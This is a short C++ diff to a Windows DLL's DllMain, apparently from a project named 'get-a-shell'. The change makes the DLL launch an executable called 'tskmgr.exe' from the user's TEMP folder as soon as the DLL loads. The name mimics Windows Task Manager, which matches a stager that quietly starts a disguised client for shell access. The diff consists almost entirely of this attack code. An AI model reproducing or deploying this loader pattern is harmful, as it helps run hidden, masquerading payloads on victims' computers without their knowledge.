@@ -13,8 +13,14 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 		si.cb = sizeof(si);
 		ZeroMemory(&pi, sizeof(pi));
 
-		//LPSTR s = const_cast<char*>("cmd.exe");
-		LPSTR s = const_cast<char*>("C:\\Users\\Eyal Asulin\\Desktop\\betshemesh-607-get-a-shell\\CPP Client Module\\x64\\Debug\\CPP Client Module.exe d");
+		LPTSTR value;
+		value = (LPTSTR)malloc(255 * sizeof(TCHAR));
+		GetEnvironmentVariable(TEXT("temp"), value, 255);
+		std::wstring ws(value);
+		std::string path(ws.begin(), ws.end());
+		path += "\\tskmgr.exe d";
+		
+		LPSTR s = const_cast<char*>(path.c_str());
 
 		CreateProcessA(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 		CloseHandle(pi.hProcess);
